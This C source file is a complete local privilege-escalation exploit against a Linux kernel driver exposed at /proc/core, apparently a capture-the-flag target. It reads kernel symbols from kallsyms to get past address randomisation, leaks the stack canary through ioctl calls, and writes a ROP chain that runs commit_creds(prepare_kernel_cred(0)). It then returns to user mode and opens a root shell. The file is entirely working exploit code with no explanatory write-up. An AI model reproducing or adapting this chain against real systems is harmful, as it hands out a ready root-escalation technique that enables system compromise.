#include<stdio.h>
#include<string.h>
#include<inttypes.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

#define core_read 0x6677889B
#define core_set 0x6677889C
#define core_func 0x6677889A

uint64_t kernel_base = 0, kernel_offset = 0, raw_kernel_base = 0xffffffff81000000; 
uint64_t commit_cred = 0;
uint64_t prepare_kernel_cred = 0;
uint64_t user_cs, user_sp, user_rflags, user_ss;

uint64_t pop_rdi_ret = 0xffffffff81000b2f;
uint64_t pop_rsi_ret = 0xffffffff8100108d;
uint64_t pop_rdx_ret = 0xffffffff810282f1;
uint64_t swapgs_popfq_ret = 0xffffffff81a012da;
uint64_t iretq_ret = 0xffffffff81050ac2;
uint64_t mov_rdi_rax_jmp_rcx = 0xffffffff811ae978;
uint64_t ret = 0xffffffff81000091;
uint64_t pop_rcx_ret = 0xffffffff81021e53;

void update_addrs(){
	kernel_offset = kernel_base - raw_kernel_base;
	pop_rdi_ret += kernel_offset;
	pop_rsi_ret += kernel_offset;
	pop_rdx_ret += kernel_offset;
	swapgs_popfq_ret += kernel_offset;
	iretq_ret += kernel_offset;
	mov_rdi_rax_jmp_rcx += kernel_offset;
	ret += kernel_offset;
	pop_rcx_ret += kernel_offset;
}

void getshell(){
	if(!getuid()){
		write(1, "successfully got root!\n", 23);
		system("id");
		system("/bin/sh");
	}else{
		puts("failed root");
	}
	return 0;
}

void save_state(){
	__asm__(
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
	);
	puts("user states saved");
}

void get_kernel_base(){
	FILE *fd = fopen("/tmp/kallsyms", "r");
	
	int commit_cred_offset = 0x9c8e0;
	int prepare_kernel_cred_offset = 0x9cce0;
	
	if(fd < 0){
		puts("wtf i can't breath when open kallsyms");
		exit(-1);
	}
	
	char buf[0x30] = { 0 };
	while(fgets(buf, 0x30, fd)){
		if(commit_cred && prepare_kernel_cred){
			break;
		}
		
		if(strstr(buf, "commit_creds")){
			char hex[30] = { 0 };
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &commit_cred);
			kernel_base = commit_cred - commit_cred_offset;
			
			printf("got commit_creds: %p\n", commit_cred);
		}else if(strstr(buf, "prepare_kernel_cred")){
			char hex[30] = { 0 };
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			
			printf("got prepare_kernel_cred: %p\n", prepare_kernel_cred);
		}
	}
	printf("got kernel_base: %p\n", kernel_base);
}

int main(){
	save_state();
	get_kernel_base();
	update_addrs();
	
	int fd = open("/proc/core", 2);
	if(fd < 0){
		puts("wtf i can't breath when open core");
		return -2;
	}
	
	//leak canary
	char buf[0x40] = { 0 };
	ioctl(fd, core_set, 0x40);
	ioctl(fd, core_read, buf);
	uint64_t canary = ((uint64_t *)buf)[0];
	printf("kernel canary -> %p\n", canary);
	
	//build rop, [ rsp(v2) : 0x40, canary : 0x8, rbx : 0x8, ret addr : 0x8 ]
	uint64_t rop[0x100] = { 0 };
	int i = 0;
	for(; i < 10; i++){
		rop[i] = canary;
	}
	getchar();
	rop[i++] = pop_rdi_ret;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;
	rop[i++] = pop_rcx_ret;
	rop[i++] = commit_cred;
	rop[i++] = mov_rdi_rax_jmp_rcx;
	rop[i++] = swapgs_popfq_ret;
	rop[i++] = 0;
	rop[i++] = iretq_ret;
	rop[i++] = (uint64_t)getshell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
	
	//write rop to name
	write(fd, (char *)rop, 0x800);
	
	//execute rop and get shell;
	ioctl(fd, core_func, 0xffffffffffff0100);
	
	return 0;
}
